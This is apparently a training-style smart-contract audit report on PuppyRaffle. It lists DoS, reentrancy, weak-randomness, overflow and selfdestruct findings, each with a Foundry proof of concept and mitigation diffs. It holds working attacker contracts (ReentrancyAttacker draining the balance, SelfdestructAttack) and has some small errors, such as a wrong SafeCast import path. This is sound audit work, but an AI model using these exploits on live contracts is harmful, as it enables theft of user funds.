### [M-1] Looping through players array to check for duplicates in `PuppyRaffle::enterRaffle` is a potential denial of service (DoS) attack, incrementing gas costs for future entrants.

**Description:** The `PuppyRaffle::enterRaffle` function loops through the `players` array to check for duplicate entries. However, the longer the `players` array is, the more checks a new player will have to make. This means the gas costs for players who enter right when the starts will be dramatically lower than those who enter later on. Every additional address in the `players` array is an additional check the loop will have to make.

```javascript
        // Check for duplicates
>>      for (uint256 i = 0; i < players.length - 1; i++) {
            for (uint256 j = i + 1; j < players.length; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }
```

**Impact:** The gas cost for entrants will greatly increase as more players enter the raffle. Discouraing later users from entering and causing a rush at the start of the raffle. An attacker might make the array so big that no else can feasibly enter, guarenteeing the win for themselves.

**Proof of Concept:**

If we enter 2 sets of a thousand players, the costs will be as following

Gas cost for entering the first 1000 players: 417422122

Gas cost for entering the second 1000 players: 1600800307

This is 3.8 times more cost.

<details>
<summary> PoC </summary>

Place the following into your PuppyRaffleTest.t.sol

```javascript
    function test_dos() public {
        //Setting the gas price to 1
        vm.txGasPrice(1);
        //Lets enter 1000 players
        address[] memory players = new address[](1000);
        for(uint i = 0; i<1000; i++){
            players[i] = address(i);
        }
        //Gas cost for entering the first 1000 players
        uint256 gasStartA = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
        uint256 gasEndA = gasleft();
        uint256 gasUsedA = (gasStartA - gasEndA) * tx.gasprice;
        console.log("Gas cost for entering the first 1000 players: ", gasUsedA);

        //Lets enter another 1000 players
        for(uint i = 0; i<1000; i++){
            players[i] = address(i+1000);
        }
        //Gas cost for entering the second 1000 players
        uint256 gasStartB = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
        uint256 gasEndB = gasleft();
        uint256 gasUsedB = (gasStartB - gasEndB) * tx.gasprice;
        console.log("Gas cost for entering the second 1000 players: ", gasUsedB);

        assertTrue(gasUsedA < gasUsedB);
    }
```

</details>

**Recommended Mitigation:**

1. Consider allow duplicates. A user can generate new addresses with little so a duplicate check will not prevent the same person entering multiple times. Only a single wallet.
2. Consider using a mapping to check for duplicates. This would allow constant time lookup of whether a user has already entered.
3. Use OpenZeppelins EnumurableSet library.

### [M-2] `PuppyRaffle::getActivePlayerIndex` will return 0 for the first player which will make the first player assume they are not an active player.

**Description:** The `PuppyRaffle::getActivePlayerIndex` function loops through the `players` array to check for the players address and returns 0 if it's not found. However, it also returns the position of the array the player is found in. A player can be in `players[0]` position which will also return 0.

```javascript
        function getActivePlayerIndex(address player) external view returns (uint256) {
        for (uint256 i = 0; i < players.length; i++) {
            if (players[i] == player) {
>>              return i;
            }
        }
        return 0;
    }
```

**Impact:** The first player will assume they are not an active player in the raffle and will waste funds attempting to enter the raffle again. They will be rejected for being a duplicate entry by the `PuppyRaffle::enterRaffle` function which will waste gas costs for the user. This will also have a reputation hit as the user can share with others that the raffle is broken and to not interact with it.

**Proof of Concept:**

<details>
<summary> PoC </summary>

Place the following into your PuppyRaffleTest.t.sol

```javascript
    function test_getActivePlayersIndexReturnsZeroWhenPlayerIsInZeroPosition() public {
        address[] memory players = new address[](1);
        players[0] = address(1);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        assertEq(puppyRaffle.getActivePlayerIndex(address(1)), 0);
    }
```

</details>

**Recommended Mitigation:**

1. Consider verifying that the user is an active player before looking for the index. You can update `PuppyRaffle::_isActivePlayer` to accept an address then call it in `PuppyRaffle::getActivePlayerIndex` in a require statement to ensure the user exists. The require statement can throw an error to tell the player that there is no index for them as they are not an active participant.

<details>
<summary> Update _isActivePlayerIndex to this </summary>

Place the following into your PuppyRaffleTest.t.sol

```diff
    /// @notice this function will return true if the msg.sender is an active player
+   function _isActivePlayer(address player) internal view returns (bool) {
-   function _isActivePlayer() internal view returns (bool) {
        for (uint256 i = 0; i < players.length; i++) {
+           if (players[i] == player) {
-           if (players[i] == msg.sender) {
                return true;
            }
        }
        return false;
    }
```

</details>

<details>
<summary> Add require statement to getActivePlayerIndex </summary>

Place the following into your PuppyRaffleTest.t.sol

```diff
    function getActivePlayerIndex(address player) external view returns (uint256) {
+       require(_isActivePlayer(player), 'PuppyRaffle: Not active player')
        for (uint256 i = 0; i < players.length; i++) {
            if (players[i] == player) {
                return i;
            }
        }
-       return 0;
    }
```

</details>

### [H-1] Sending refund before updating players array in `PuppyRaffle::refund` allows for attacker to drain the protocol using a reentrancy attack.

**Description:** The `PuppyRaffle::refund` sends the refund to the msg.sender before assigning that index to the 0 address. If the receipient of the address is a contract which has a receive() method to call the function again with the same index, the `PuppyRaffle::refund` will evaluate the index again, see a valid `PuppyRaffle::playerAddress` and resend the refund.

```javascript
        function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

>>      payable(msg.sender).sendValue(entranceFee);

        players[playerIndex] = address(0);
        emit RaffleRefunded(playerAddress);
    }
```

**Impact:** The attacker can steal all the funds in the protocol.

**Proof of Concept:**

This attack required an attacking contract to be in receipt of the funds. The following is the output of the test demonstrating the attack.

Logs:

Starting balance of PuppyRaffle is: 4000000000000000000

Starting balance of Attacker is: 0

Ending balance of PuppyRaffle is: 0

Ending balance of Attacker is: 5000000000000000000

<details>
<summary> PoC </summary>

Place the following test into your PuppyRaffleTest.t.sol

```javascript
    function test_ReentrancyAttack() public {
        address[] memory players = new address[](4);
        players[0] = address(1);
        players[1] = address(2);
        players[2] = address(3);
        players[3] = address(4);
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);
        address attacker = makeAddr("attacker");
        vm.deal(attacker, 1 ether);

        uint256 attackerContractStartingBalance = address(attackerContract).balance;
        uint256 puppyRaffleStartingBalance = address(puppyRaffle).balance;

        console.log("Starting balance of PuppyRaffle is: ", puppyRaffleStartingBalance);
        console.log("Starting balance of Attacker is: ", attackerContractStartingBalance);

        vm.prank(attacker);
        attackerContract.attack{value: entranceFee}();

        uint256 attackerContractEndingBalance = address(attackerContract).balance;
        uint256 puppyRaffleEndingBalance = address(puppyRaffle).balance;

        console.log("Ending balance of PuppyRaffle is: ", puppyRaffleEndingBalance);
        console.log("Ending balance of Attacker is: ", attackerContractEndingBalance);
    }
```

And the following attacking contract in the same file

```javascript
contract ReentrancyAttacker {

    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    uint256 attackerIndex;

    constructor(PuppyRaffle _puppyRaffle){
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    function _stealBalance() internal {
        if(address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }

    fallback() external payable{
        _stealBalance();
    }

    receive() external payable{
        _stealBalance();
    }
}
```

</details>

**Recommended Mitigation:**

1. Apply the Check-Effect-Interactions (CEI) design pattern by moving the transfer after updating the players array

<details>
<summary> Mitigation </summary>

```diff
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

-       payable(msg.sender).sendValue(entranceFee);

        players[playerIndex] = address(0);
+       payable(msg.sender).sendValue(entranceFee);
        emit RaffleRefunded(playerAddress);
    }
```

</details>

2. Add a boolean variable that controls access to the refund function during a transaction

<details>
<summary> Mitigation </summary>

```diff
+   bool private locked = false;

    function refund(uint256 playerIndex) public {
+       require(locked == false, "PupprRaffle: Refund is locked");
+       locked = true;
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

        payable(msg.sender).sendValue(entranceFee);

        players[playerIndex] = address(0);
        emit RaffleRefunded(playerAddress);
+       locked = false;
    }
```

</details>

3. Use the nonReentrant modifier in the ReentrancyGuard provided by the OpenZeppelins library.

### [H-2] Insufficient randomness in `PuppyRaffle::selectWinner` allows the attacker to select the winner and rarity

**Description:** An attacker can calculate `PuppyRaffle::winnerIndex` and `PuppyRaffle::rarity` in advance. The value of `PuppyRaffle::winnerIndex` can be calulcated in advance by manipulating the block.timestamp to ensure they are selected as the winner.

The value of block.difficulty is a constant of 0 since the merge so rarity will always calculate to the same value for each wallet. An attacker can generate new wallets until they receive the rarity value they want completely removing the randomness.

```javascript
    function selectWinner() external {
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
>>      uint256 winnerIndex =
>>        uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
        address winner = players[winnerIndex];
        uint256 totalAmountCollected = players.length * entranceFee;
        uint256 prizePool = (totalAmountCollected * 80) / 100;
        uint256 fee = (totalAmountCollected * 20) / 100;
        totalFees = totalFees + uint64(fee);

        uint256 tokenId = totalSupply();

        // We use a different RNG calculate from the winnerIndex to determine rarity
>>      uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;
        if (rarity <= COMMON_RARITY) {
            tokenIdToRarity[tokenId] = COMMON_RARITY;
        } else if (rarity <= COMMON_RARITY + RARE_RARITY) {
            tokenIdToRarity[tokenId] = RARE_RARITY;
        } else {
            tokenIdToRarity[tokenId] = LEGENDARY_RARITY;
        }

        delete players;
        raffleStartTime = block.timestamp;
        previousWinner = winner;
        (bool success,) = winner.call{value: prizePool}("");
        require(success, "PuppyRaffle: Failed to send prize pool to winner");
        _safeMint(winner, tokenId);
    }
```

**Impact:** The attacker can ensure that they always win the raffle and mint the rarest NFT.

**Proof of Concept:**

<details>
<summary> PoC </summary>

</details>

**Recommended Mitigation:**

1. Use Chainlink VRF to ensure random values. See more here: https://docs.chain.link/vrf/
2. Use a commit reveal scheme

### [H-3] Arithmetic overflow in `PuppyRaffle::selectWinner` for `PuppyRaffle::totalFees` calculation will make it impossible to withdraw fees.

**Description:** As `PuppyRaffle::totalFees` is of type uint64 and `PuppyRaffle::fee` is type uint256. the value of fee can be much bigger than totalFees which will cause it overflow. This would cause the requirement stated in `PuppyRaffle::withdrawFees` to fail making it impossible to withdraw the fees that were collected.

**Impact:** The protocol can no longer withdraw fees

**Proof of Concept:**

Place this in your PuppyRaffleTest.t.sol

<details>
<summary> PoC </summary>

```javascript
    function test_ArithmeticOverflowOfFeesStopsWithdrawls() public {
        //Lets enter 100 players
        address[] memory players = new address[](100);
        for(uint i = 0; i<100; i++){
            players[i] = address(i);
        }
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
        //Select Winner
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        puppyRaffle.selectWinner();
        //Attempt to withdraw
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }
```

</details>

**Recommended Mitigation:**

1. Upgrade to version of solidity >0.8 which comes with arithmetic checks for free

```diff

++pragma solidity 0.8.18;
--pragma solidity ^0.7.6;

```

2. Rework contract to use OpenZeppelin SafeCast to catch this typecast error on fees and handle in rework

```diff

++  import {SafeCast} from "@openzeppelin/contracts/utils/Address.sol";

contract PuppyRaffle is ERC721, Ownable {
    using Address for address payable;
++  using SafeCast for uint256;
    ...
}
```

3. Change totalFees to a type of uint256 and remove the typecasting on fees

<details>

```diff

++  uint256 public totalFees = 0;
--  uint64 public totalFees = 0;

```

```diff
    function selectWinner() external {
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
        uint256 winnerIndex =
            uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
        address winner = players[winnerIndex];
        uint256 totalAmountCollected = players.length * entranceFee;
        uint256 prizePool = (totalAmountCollected * 80) / 100;
        uint256 fee = (totalAmountCollected * 20) / 100;
++      totalFees = totalFees + fee;
--      totalFees = totalFees + uint64(fee);

        uint256 tokenId = totalSupply();

        // We use a different RNG calculate from the winnerIndex to determine rarity
        uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;
        if (rarity <= COMMON_RARITY) {
            tokenIdToRarity[tokenId] = COMMON_RARITY;
        } else if (rarity <= COMMON_RARITY + RARE_RARITY) {
            tokenIdToRarity[tokenId] = RARE_RARITY;
        } else {
            tokenIdToRarity[tokenId] = LEGENDARY_RARITY;
        }

        delete players;
        raffleStartTime = block.timestamp;
        previousWinner = winner;
        (bool success,) = winner.call{value: prizePool}("");
        require(success, "PuppyRaffle: Failed to send prize pool to winner");
        _safeMint(winner, tokenId);
    }
```

</details>

### [H-4] Unsafe casting in `PuppyRaffle::selectWinner` for `PuppyRaffle::fee` will lead to reduction in fees collected

**Description:** `PuppyRaffle::fee` is type casted uint64 when it has a type of uint256 which means that when fee has a value larger than uint64 the value will wrap around to 0 losing all the previous fees.

```javascript
    function selectWinner() external {
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
        uint256 winnerIndex =
            uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
        address winner = players[winnerIndex];
        uint256 totalAmountCollected = players.length * entranceFee;
        uint256 prizePool = (totalAmountCollected * 80) / 100;
        uint256 fee = (totalAmountCollected * 20) / 100;
>>      totalFees = totalFees + uint64(fee);

        uint256 tokenId = totalSupply();

        // We use a different RNG calculate from the winnerIndex to determine rarity
        uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;
        if (rarity <= COMMON_RARITY) {
            tokenIdToRarity[tokenId] = COMMON_RARITY;
        } else if (rarity <= COMMON_RARITY + RARE_RARITY) {
            tokenIdToRarity[tokenId] = RARE_RARITY;
        } else {
            tokenIdToRarity[tokenId] = LEGENDARY_RARITY;
        }

        delete players;
        raffleStartTime = block.timestamp;
        previousWinner = winner;
        (bool success,) = winner.call{value: prizePool}("");
        require(success, "PuppyRaffle: Failed to send prize pool to winner");
        _safeMint(winner, tokenId);
    }
```

**Impact:** The protocol will lose the fees it has collected and less fees will be withdrawn

**Proof of Concept:**

Divide the logged values below by 1e18 to convert to ether value. The fees calculated are 20 ether but the protocol calculates totalFees are 1.5 ether.

Logs:
Balance of PuppyRaffle before selectWinner: 100000000000000000000

Fees calculated to be collected: 20000000000000000000

Balance of PuppyRaffle after selectWinner: 20000000000000000000

Value of totalFees after select winner: 1553255926290448384

<details>
<summary> PoC </summary>

Place this into your PuppyRaffleTest.t.sol

```javascript
    function test_UnsafeTypeCastingOfFees() public {
        //Lets enter 100 players
        address[] memory players = new address[](100);
        for(uint i = 0; i<100; i++){
            players[i] = address(i);
        }
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
        //Calculate expected fees to be collected
        uint256 totalAmountCollected = address(puppyRaffle).balance;
        uint256 fee = (totalAmountCollected * 20) / 100;
        console.log("Balance of PuppyRaffle before selectWinner: ", address(puppyRaffle).balance);
        console.log("Fees calculated to be collected: ", fee);
        //Select Winner
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        puppyRaffle.selectWinner();
        //Actual fees to be collected
        console.log("Balance of PuppyRaffle after selectWinner: ", address(puppyRaffle).balance);
        console.log("Value of totalFees after select winner: ", puppyRaffle.totalFees());
        //Assertions
        assertTrue(fee > type(uint64).max);
        assertTrue(puppyRaffle.totalFees() < fee);
        assertTrue(puppyRaffle.totalFees() < type(uint64).max);
    }
```

</details>

**Recommended Mitigation:**

1. Upgrade to version of solidity >0.8 which comes with arithmetic checks for free

```diff

++pragma solidity 0.8.18;
--pragma solidity ^0.7.6;

```

2. Rework contract to use OpenZeppelin SafeCast to catch this typecast error on fees and handle in rework

```diff

++  import {SafeCast} from "@openzeppelin/contracts/utils/Address.sol";

contract PuppyRaffle is ERC721, Ownable {
    using Address for address payable;
++  using SafeCast for uint256;
    ...
}
```

3. Change totalFees to a type of uint256 and remove the typecasting on fees

<details>

```diff

++  uint256 public totalFees = 0;
--  uint64 public totalFees = 0;

```

```diff
    function selectWinner() external {
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
        uint256 winnerIndex =
            uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
        address winner = players[winnerIndex];
        uint256 totalAmountCollected = players.length * entranceFee;
        uint256 prizePool = (totalAmountCollected * 80) / 100;
        uint256 fee = (totalAmountCollected * 20) / 100;
++      totalFees = totalFees + fee;
--      totalFees = totalFees + uint64(fee);

        uint256 tokenId = totalSupply();

        // We use a different RNG calculate from the winnerIndex to determine rarity
        uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;
        if (rarity <= COMMON_RARITY) {
            tokenIdToRarity[tokenId] = COMMON_RARITY;
        } else if (rarity <= COMMON_RARITY + RARE_RARITY) {
            tokenIdToRarity[tokenId] = RARE_RARITY;
        } else {
            tokenIdToRarity[tokenId] = LEGENDARY_RARITY;
        }

        delete players;
        raffleStartTime = block.timestamp;
        previousWinner = winner;
        (bool success,) = winner.call{value: prizePool}("");
        require(success, "PuppyRaffle: Failed to send prize pool to winner");
        _safeMint(winner, tokenId);
    }
```

</details>

### [H-5] Mishandling of ether in `PuppyRaffle::withdrawFees` will block any fees being withdrawn from the protocol

**Description:** The require statement in `PuppyRaffle::withdrawFees` can be broken be selfdestructing a contract with a little ether and setting PuppyRaffle as the recipient address. The ether balance of PuppyRaffle will be updated and withdraw fees will forever fail the require statement.

```javascript
    function withdrawFees() external {
>>      require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
        uint256 feesToWithdraw = totalFees;
        totalFees = 0;
        (bool success,) = feeAddress.call{value: feesToWithdraw}("");
        require(success, "PuppyRaffle: Failed to withdraw fees");
    }
```

**Impact:** The protocol will no longer be able to withdraw fees

**Proof of Concept:**

Logs:

Balance of contract before attack: 800000000000000000

Balance of fees before attack: 800000000000000000

Balance of contract after attack: 800000000000000001

Balance of fees after attack: 800000000000000000

<details>
<summary> PoC </summary>

Place this test into PuppyRaffleTest.t.sol

```javascript
 function test_SelfdestructToBreakWithdraw() public {
        //Enter players
        address[] memory players = new address[](4);
        players[0] = address(1);
        players[1] = address(2);
        players[2] = address(3);
        players[3] = address(4);
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        //Select winner
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        puppyRaffle.selectWinner();
        //Balances before
        console.log("Balance of contract before attack: ", address(puppyRaffle).balance);
        console.log("Balance of fees before attack: ", puppyRaffle.totalFees());
        //Selfdestruct attacker contract
        SelfdestructAttack attackerContract = new SelfdestructAttack(puppyRaffle);
        address attacker = makeAddr("attacker");
        vm.prank(attacker);
        vm.deal(attacker, 1 wei);
        attackerContract.attack{value: 1 wei}();
        //Balances
        console.log("Balance of contract after attack: ", address(puppyRaffle).balance);
        console.log("Balance of fees after attack: ", puppyRaffle.totalFees());
        //Withdraw
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }
```

And the following contract

```javascript
contract SelfdestructAttack {
    PuppyRaffle puppyRaffle;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
    }

    function attack() public payable {
        address payable addr = payable(address(puppyRaffle));
        selfdestruct(addr);
    }
}
```

</details>

**Recommended Mitigation:**

1. Instead of an equality check change it to a greater than or equal to check. Rework the contract to track the prizepool and fees as people enter and refund seperately. The require statement can then verify against the current prizepool and totalFees to ensure that prizepool funds are not being withdrawn.

```diff
    uint256 s_prizepool;

    function withdrawFees() external {
++      require(address(this).balance >= (uint256(totalFees) + s_prizepool), "PuppyRaffle: There are currently players active!");
--      require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
        uint256 feesToWithdraw = totalFees;
        totalFees = 0;
        (bool success,) = feeAddress.call{value: feesToWithdraw}("");
        require(success, "PuppyRaffle: Failed to withdraw fees");
    }
```

2. Instead of an equality check change it to a greater than or equal to check. Rework the contract so it can be paused after a winner is selected to disallow players to join the raffle so the prizepool is 0. Then attempt to withdraw the fees.
